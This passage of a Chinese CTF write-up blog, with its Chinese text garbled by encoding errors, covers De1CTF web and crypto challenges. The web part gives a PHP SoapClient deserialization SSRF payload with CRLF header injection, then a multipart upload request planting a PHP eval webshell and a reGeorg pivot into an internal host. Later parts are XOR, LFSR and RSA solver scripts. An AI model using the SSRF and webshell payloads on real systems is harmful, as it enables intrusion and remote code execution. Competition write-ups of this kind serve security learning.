class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a343a2261616162223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31313a225f757365725f6167656e74223b733a3230313a22777570636f0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d663176723566383138396c6d366f7171746f64716b76703772360d0a436f6e74656e742d4c656e6774683a2034390d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d393135373230223b733a31333a225f736f61705f76657273696f6e223b693a313b7d</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç­¾åå¤„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-77f7c3c693072c6a.png" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7a28c7deda6af8d7.png" alt="image.png"></p><p>åˆ·æ–°ä¸€ä¸‹PHPSESSIDæ˜¯f1vr5f8189lm6oqqtodqkvp7r6çš„æµè§ˆå™¨é¡µé¢ï¼Œå°±æ˜¯adminäº†ã€‚</p><p>è¿›å…¥adminï¼Œå†™ä¸ªé©¬ï¼Œç„¶åè®¿é—®/upload/gml.phpï¼Œå°±å¯ä»¥å¾—åˆ°webshellï¼Œç„¶åæç¤ºè¯´flagåœ¨å†…ç½‘æœºå™¨é‡Œã€‚ã€‚ã€‚</p><p>ifconfigå‘ç°æœºå™¨ipæ˜¯172.18.0.3ï¼Œæ‰«ä¸€ä¸‹å‘ç°å†…ç½‘ 172.18.0.2 åœ¨ 80ç«¯å£å¼€ç€ä¸€ä¸ªwebæœåŠ¡ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a4f6261550a14813.png" alt="image.png"></p><p>åˆæ˜¯ä¸€é“åŸé¢˜ï¼Œå»å¹´ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›çš„é¢˜ã€‚ã€‚ã€‚å‚è€ƒ<a href="https://blog.cindemor.com/post/ctf-web-12.html">https://blog.cindemor.com/post/ctf-web-12.html</a></p><p>æ­ä¸ªä»£ç†ï¼Œä½¿ç”¨reGeorgSocksProxyï¼Œ<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>burpé…ä¸ªäºŒé‡ä»£ç†ï¼š</p><p>æ„é€ äº†è¿™ä¸ªèƒ½å†™é©¬æ•°æ®åŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 172.18.0.2</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------444980421912</span><br><span class="line"><span class="attribute">Content-Length</span>: 650</span><br><span class="line"></span><br><span class="line">-----------------------------444980421912</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">@&lt;?php  echo 1;@eval($_POST[&#x27;gml&#x27;]);?&gt;</span><br><span class="line">-----------------------------444980421912</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file[1]&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br><span class="line"><span class="attribute">-----------------------------444980421912</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;file[0]&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">php/.</span></span><br><span class="line"><span class="attribute">-----------------------------444980421912</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;hello&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">php/../shell.php</span></span><br><span class="line"><span class="attribute">-----------------------------444980421912</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;gml&quot;</span><br><span class="line"></span><br><span class="line">system(&quot;ls /&quot;);</span><br><span class="line">-----------------------------444980421912--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘åŒ…ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a1c3ec218aa3a292.png" alt="image.png"></p><p>çˆ†ç ´æ–‡ä»¶åï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-29c513374b291b2f.png" alt="image.png"></p><p>é¢˜ç›®ä¸­è¯´flagå«æœ‰flagå…³é”®å­—ï¼Œç›´æ¥æŸ¥æ‰¾ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-cd2bb3c423d49a43.png" alt="image.png"></p><p>getflag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xorz"><a href="#xorz" class="headerlink" title="xorz"></a>xorz</h3><p>å»å¹´ HCTF å‡ºè¿‡ç±»ä¼¼çš„ï¼Œkeyå¾ªç¯ä½¿ç”¨å¼‚æˆ–å¾ˆé•¿çš„æ˜æ–‡ï¼Œè¿™é“é¢˜è¿˜å¼‚æˆ–äº†ä¸ªsaltï¼Œä¸è¿‡saltå·²çŸ¥ï¼Œå¼‚æˆ–å›å»å°±å¥½äº†ã€‚</p><p>å·ä¸€æ³¢å¤©æ¢HCTFå½“æ—¶çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span>(<span class="params">b1, b2</span>):</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span>(<span class="params">text</span>):</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space = <span class="number">0</span></span><br><span class="line">    max_possible = <span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible &gt; max_possible:</span><br><span class="line">            max_possible = maxpossible</span><br><span class="line">            possible_space = a</span><br><span class="line">    key = text[possible_space] ^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = libnum.n2s(<span class="built_in">int</span>(<span class="string">&quot;1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79&quot;</span>,<span class="number">16</span>))</span><br><span class="line">b = <span class="built_in">bytes</span>(b, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE, _ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><blockquote><p>de1ctf{W3lc0m3tOjo1nu55un1ojOt3m0cl3W}</p></blockquote><h3 id="babylfsr"><a href="#babylfsr" class="headerlink" title="babylfsr"></a>babylfsr</h3><p>ç»™äº†ç”Ÿæˆçš„æ¯”ç‰¹æµï¼Œæ²¡ç»™maskï¼Œ256 bitï¼Œæ— çˆ†ç ´å¯èƒ½ã€‚</p><p>å‚è€ƒï¼š <a href="https://blog.csdn.net/kevin66654/article/details/80554932">https://blog.csdn.net/kevin66654/article/details/80554932</a> </p><p>æ€è·¯æ˜¯æ ¹æ®ç”Ÿæˆçš„æ¯”ç‰¹æµï¼Œæ„é€ çŸ©é˜µä¹˜æ³•æ¥è¿˜åŸmaskï¼Œç›¸å½“äº M * mask = Cï¼Œå…¶ä¸­Mæ˜¯256*256çš„çŸ©é˜µï¼Œmaskå’ŒCæ˜¯256*1çš„åˆ—å‘é‡ï¼ˆæ–¹ç¨‹ä¸­ä¸­æ‰€æœ‰çš„å…ƒç´ ä¸æ˜¯0å°±æ˜¯1ï¼ŒåŠ æ³•ç›¸å½“äºå¼‚æˆ–ï¼‰ï¼Œé«˜æ–¯æ¶ˆå…ƒå»æ‰ M ï¼Œå¾—åˆ°maskã€‚</p><p>ä½†æ˜¯è¿™é‡Œé¢æˆ‘ä»¬åªæœ‰508ä¸ªæ¯”ç‰¹ï¼Œè¿˜éœ€è¦8ä¸ªbitæ‰èƒ½è§£å‡ºmaskï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çˆ†ç ´8ä¸ªbitï¼Œæ¯ç§æƒ…å†µæ±‚å‡ºçš„maskéƒ½å»è¿˜åŸä¸€ä¸‹keyï¼Œå› ä¸ºé¢˜ç›®ç»™äº†key sha256çš„å‰å››ä½ï¼Œæ‰€ä»¥å¯ä»¥å»æ¯”å¯¹ï¼Œå‰å››ä½å¯¹ä¸Šçš„å°±æ˜¯flagã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;output&quot;</span>, <span class="string">&quot;r&quot;</span>).read().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>(<span class="params">stream</span>):</span></span><br><span class="line">    dim = <span class="number">256</span></span><br><span class="line">    magic = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[i:i + <span class="number">256</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    cipher = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[<span class="number">256</span>:]))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) == <span class="number">256</span></span><br><span class="line">    <span class="comment">#é«˜æ–¯æ¶ˆå…ƒ</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, cipher)), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSR_inv</span>(<span class="params">R, mask</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">bin</span>(R)[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    new = <span class="built_in">str</span>[<span class="number">-1</span>:] + <span class="built_in">str</span>[:<span class="number">-1</span>]</span><br><span class="line">    new = <span class="built_in">int</span>(new, <span class="number">2</span>)  <span class="comment"># Rå¾ªç¯å³ç§»ä¸€ä½å¾—åˆ°new</span></span><br><span class="line">    i = (new &amp; mask) &amp; (<span class="number">2</span> ** <span class="number">257</span> - <span class="number">1</span>)</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R &gt;&gt; <span class="number">1</span> | lastbit &lt;&lt; <span class="number">255</span>  <span class="comment"># æœ€é«˜ä½ç”¨lastbitå¡«å……</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">stream</span>):</span></span><br><span class="line">    mask = get_mask(stream)</span><br><span class="line">    c = <span class="built_in">int</span>(stream[:<span class="number">256</span>], <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        c = LFSR_inv(c, mask)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(<span class="string">&quot;01&quot;</span>, repeat=<span class="number">8</span>):</span><br><span class="line">    stream = data + <span class="string">&quot;&quot;</span>.join(s)</span><br><span class="line">    KEY = get_key(stream)</span><br><span class="line">    flag = hashlib.sha256(<span class="built_in">hex</span>(KEY)[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">4</span>] == <span class="string">&quot;1224&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;de1ctf&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;not &quot;</span>, i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f8ed62efc7cc0aa4.png" alt="image.png"></p><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>å¥—å¨ƒä¸€æ ·ï¼Œé¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1,e2,p,q1p,q1q,hint,flag</span><br><span class="line"></span><br><span class="line">n =  [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c =  [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f=<span class="keyword">lambda</span> m,e,n,c:<span 